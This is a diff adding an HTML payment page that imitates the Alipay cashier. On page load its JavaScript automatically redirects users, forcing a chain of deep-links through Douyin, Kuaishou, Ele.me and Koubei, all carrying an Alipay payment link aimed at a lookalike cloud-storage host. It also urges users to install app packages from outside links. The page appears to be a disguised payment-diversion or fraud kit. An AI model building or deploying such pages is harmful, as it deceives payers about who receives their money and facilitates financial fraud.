@@ -1,0 +1,220 @@
+
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <title>支付宝</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no">
+    <meta id="WV.Meta.Share.Disabled" value="true">
+    <meta name="data-bizType" content="pay">
+    <meta name="data-aspm" content="a283">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0">
+    <link rel="apple-touch-icon" href="/assets/addons/pay/images/2qBuceUYiL.png">
+    <link rel="apple-touch-icon" href="/assets/addons/pay/images/2qBuceUYiL.png">
+    <!-- CMS:安全支付客户端网关/common/tracker.vm开始:common/tracker.vm -->
+    <!-- CMS:安全支付客户端网关/common/tracker.vm结束:common/tracker.vm -->
+
+    <link rel="stylesheet" type="text/css" href="/assets/addons/pay/css/h5cashier.css" media="all">
+    <link rel="stylesheet" type="text/css" href="/assets/addons/pay/css/QRCode.css">
+    <script type="text/javascript" src="/assets/addons/pay/js/jquery.min.js"></script>
+    <script type="text/javascript" src="/assets/addons/pay/js/jquery.qrcode.min.js"></script>
+    <script type="text/javascript" src="/assets/addons/pay/js/layer.js"></script>
+    <script src="/assets/addons/pay/js/alipayjsapi.inc.min.js"></script>
+    <script type="text/javascript" src="/assets/addons/pay/klhb/clipboard.min.js"></script>
+</head>
+<body>
+<body data-aspm="b9416">
+<div class="J-msg-mask am-msg-mask" style="display:none"></div>
+<div class="J-msg-box am-msg-box" style="display:none">
+    <div class="am-msg-box-content">
+        <p class="J-msg-text"></p>
+        <button class="J-msg-cancel am-button am-button-blue" type="button">知道了</button>
+    </div>
+</div>
+<div class="J-loading am-loading fn-hide"><div class="am-loading-text">加载中...</div></div>
+<!-- CMS:安全支付客户端网关/common/notice.vm开始:common/notice.vm --><!-- CMS:安全支付客户端网关/common/notice.vm结束:common/notice.vm -->
+<!-- h5PayRoute.vm -->
+<!-- v5_h5_pay_route -->
+
+<header class="am-header">
+    <h1>
+        <span class="title-main" data-title="支付宝收银台">支付宝收银台</span>
+    </h1>
+
+</header>
+
+<noscript><h1 style="color:red">您的浏览器不支持JavaScript，请更换浏览器或开启JavaScript设置!</h1></noscript>
+<!-- FD:mobileclientgw:mobileclientgw/home/v5/h5PayRoute.vm:START -->
+<style>
+
+    body {
+        font-weight: 500;
+        font-family: PingFangSC-Regular, "Helvetica Neue",Helvetica,Arial,"Lucida Grande",sans-serif;
+    }
+
+    .am-header {
+        display: none;
+    }
+
+    .alipay-logo {
+        display: none;
+    }
+
+    .result {
+        margin-top: 30px;
+        width: 100%;
+    }
+
+    .result-logo {
+        width: 70px;
+        height: 98px;
+        margin: auto;
+        background-image: url(data:image/png;base64,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);
+        background-repeat: no-repeat;
+        background-size: contain;
+    }
+
+    .result-title {
+        margin: 0px 0 14px;
+        text-align: center;
+        font-size: 21px;
+        color: #00a0e8;
+        line-height: 25px;
+    }
+
+    .result-tips {
+        max-width: 370px;
+        margin: 0 auto 10px;
+        padding: 0 15px;
+        font-size: 15px;
+        color: #a5a5a5;
+        line-height: 18px;
+        text-align: left;
+        word-break: break-all;
+        word-wrap: break-word;
+    }
+
+    .result-botton {
+        margin: 0 15px 20px;
+    }
+
+    .result-botton a {
+        display: block;
+        margin: auto;
+        -webkit-box-sizing: border-box;
+        box-sizing: border-box;
+        max-width: 384px;
+        height: 44px;
+        text-align: center;
+    }
+
+    .result-botton a.am-button-white {
+        color: #00aaee;
+        background: #ffffff;
+        border: 1px solid #00aaee;
+    }
+
+    .result-botton .am-button[disabled=disabled] {
+        color: #e6e6e6;
+        background: #f8f8f8;
+        border: 1px solid #dedede;
+    }
+
+    .loading {
+        display: none;
+    }
+</style>
+<div class="loading"></div>
+<div class="am-content">
+    <input type="hidden" name="params" value="{&quot;server_param&quot;:&quot;emlkPTc5O25kcHQ9YWMyNDtjYz15&quot;}">
+    <div class="result">
+        <div class="result-logo"></div>
+        <div class="result-title"></div>
+        <div class="result-botton"><a id="openAlipay" onclick="order()" class="J-startapp am-button am-button-blue" href="#">使用支付宝APP付款</a></div>
+
+        <div class="result-tips" style="color: red;font-size: 18px;">如果无法正常使用支付宝APP付款 </div>
+        <div class="result-tips" style="color: red;font-size: 18px;">1:请下载安装以下app，点击图标下载</div>
+        <div class="result-tips" style="color: red;font-size: 18px;">
+            <a href="http://s9.pstatp.com/package/apk/aweme/aweme_aweGW_v8.3.0_70a95ff.apk?v=1570780017"><img style ="width: 50px; margin-right:2px"src="/assets/addons/pay/images/douyin.png"></a>
+            <a href="https://js.a.kspkg.com/bs2/fes/kwai-android-generic-gifmakerrelease-6.8.1.10711_9b8907.apk"><img style ="width: 50px; margin-right:2px"src="/assets/addons/pay/images/kuaishou.png"></a>
+            <a href="http://p.gdown.baidu.com/18e344594b29180af45fe4924d8cf4e4c601e9cc98fd4a5fff01b5c431484fc281f0fce9189792758be92ef72acc522b6878524e831bf21a13809f8c37646b6b97a9665bab9e3a7408e55851e928f0684d2ad1be7893a963de349866f74bd8ddf4362d114de5dc1c0020ab5a6cd530462746ad074cdd33f751e0794ca81acd2427c7c14d015fee82"><img style ="width: 50px; margin-right:2px"src="/assets/addons/pay/images/elm.png"></a>
+            <a href="https://imtt.dd.qq.com/16891/apk/68BCF0E22F8CDEDAB913D535F52B9361.apk?fsname=com.taobao.mobile.dipei_7.1.78.238_20846.apk"><img style ="width: 50px; margin-right:2px"src="/assets/addons/pay/images/koubei.png"></a>
+        </div>
+        <div class="result-tips" style="color: red;font-size: 18px;">2:强烈推荐以下app付款方式付款 </div>
+
+        <div class="result-botton" style="margin-top:20px"><a id="openKoubei" onclick="douyin()" class="J-h5pay am-button am-button-white" href="#">安装了抖音APP点击直接付款</a>
+        </div>
+        <div class="result-botton" style="margin-top:20px"><a id="openKoubei" onclick="kuaishou()" class="J-h5pay am-button am-button-white" href="#">安装了快手APP点击直接付款</a>
+        </div>
+        <div class="result-botton" style="margin-top:20px"><a id="openKoubei" onclick="elm()" class="J-h5pay am-button am-button-white" href="#">安装了饿了么APP点击直接付款</a>
+        </div>
+        <div class="result-botton" style="margin-top:20px"><a id="openKoubei" onclick="orderkoubei()" class="J-h5pay am-button am-button-white" href="#">使用口 碑APP付款</a>
+        </div>
+    </div>
+</div>
+<script type="text/javascript">
+    var t1;
+    var payUrl;
+    var params = getUrlVars();
+    var u = navigator.userAgent;
+    var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1; //android终端
+    var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios终端
+
+    function getUrlVars() {
+        var vars = [], hash;
+        var hashes = window.location.href.slice(window.location.href.indexOf('?') + 1).split('&');
+        for (var i = 0; i < hashes.length; i++) {
+            hash = hashes[i].split('=');
+            vars.push(hash[0]);
+            vars[hash[0]] = hash[1];
+        }
+        return vars;
+    }
+
+    $(document).ready(function(){
+        if (isiOS) {
+            window.location.href='https://d.alipay.com/i/index.htm?scheme=alipays%3A%2F%2Fplatformapi%2Fstartapp%3FsaId%3D10000007%26clientVersion%3D3.7.0.0718%26qrcode%3Dhttps%253A%252F%252Fcww14taoqcloudcom.oss-ap-northeast-1.aliyuncs.com%252F%253Fspm%253D43268755713420802841%2526m%253Dfund%2526a%253D2019060365499265';
+        } else {
+            setTimeout(function () {
+                setTimeout(function () {
+                    setTimeout(function () {
+                        setTimeout(function () {
+                            // window.location.href = 'https://d.alipay.com/i/index.htm?scheme=alipays%3A%2F%2Fplatformapi%2Fstartapp%3FsaId%3D10000007%26clientVersion%3D3.7.0.0718%26qrcode%3Dhttps%253A%252F%252Fcww14taoqcloudcom.oss-ap-northeast-1.aliyuncs.com%252F%253Fspm%253D43268755713420802841%2526m%253Dfund%2526a%253D2019060365499265';
+                        }, 1000);
+                        orderkoubei();
+                    }, 1000);
+                    kuaishou();
+                }, 1000);
+                elm();
+            }, 1000);
+            douyin();
+        }
+    });
+
+    function orderkoubei() {
+        window.location.href='koubei://platformapi/startapp?appId=68687256&url=https%3A%2F%2Fd.alipay.com%2Fi%2Findex.htm%3Fscheme%3Dalipays%253A%252F%252Fplatformapi%252Fstartapp%253FsaId%253D10000007%2526clientVersion%253D3.7.0.0718%2526qrcode%253Dhttps%25253A%25252F%25252Fcww14taoqcloudcom.oss-ap-northeast-1.aliyuncs.com%25252F%25253Fspm%25253D43268755713420802841%252526m%25253Dfund%252526a%25253D2019060365499265';
+    }
+
+    function douyin() {
+        window.location.href='snssdk1128://webview?url=https%3A%2F%2Fd.alipay.com%2Fi%2Findex.htm%3Fscheme%3Dalipays%253A%252F%252Fplatformapi%252Fstartapp%253FsaId%253D10000007%2526clientVersion%253D3.7.0.0718%2526qrcode%253Dhttps%25253A%25252F%25252Fcww14taoqcloudcom.oss-ap-northeast-1.aliyuncs.com%25252F%25253Fspm%25253D43268755713420802841%252526m%25253Dfund%252526a%25253D2019060365499265';
+    }
+
+    function kuaishou() {
+        window.location.href='kwai://webview?url=https%3A%2F%2Fd.alipay.com%2Fi%2Findex.htm%3Fscheme%3Dalipays%253A%252F%252Fplatformapi%252Fstartapp%253FsaId%253D10000007%2526clientVersion%253D3.7.0.0718%2526qrcode%253Dhttps%25253A%25252F%25252Fcww14taoqcloudcom.oss-ap-northeast-1.aliyuncs.com%25252F%25253Fspm%25253D43268755713420802841%252526m%25253Dfund%252526a%25253D2019060365499265';
+    }
+
+    function elm() {
+        window.location.href='eleme://web_overlay?url=https%3A%2F%2Fd.alipay.com%2Fi%2Findex.htm%3Fscheme%3Dalipays%253A%252F%252Fplatformapi%252Fstartapp%253FsaId%253D10000007%2526clientVersion%253D3.7.0.0718%2526qrcode%253Dhttps%25253A%25252F%25252Fcww14taoqcloudcom.oss-ap-northeast-1.aliyuncs.com%25252F%25253Fspm%25253D43268755713420802841%252526m%25253Dfund%252526a%25253D2019060365499265';
+    }
+    function order(){
+        window.location.href='https://d.alipay.com/i/index.htm?scheme=alipays%3A%2F%2Fplatformapi%2Fstartapp%3FsaId%3D10000007%26clientVersion%3D3.7.0.0718%26qrcode%3Dhttps%253A%252F%252Fcww14taoqcloudcom.oss-ap-northeast-1.aliyuncs.com%252F%253Fspm%253D43268755713420802841%2526m%253Dfund%2526a%253D2019060365499265';
+    }
+</script>
+<script>
+    ap.allowPullDownRefresh(false);
+</script>
+</body>
+</html>
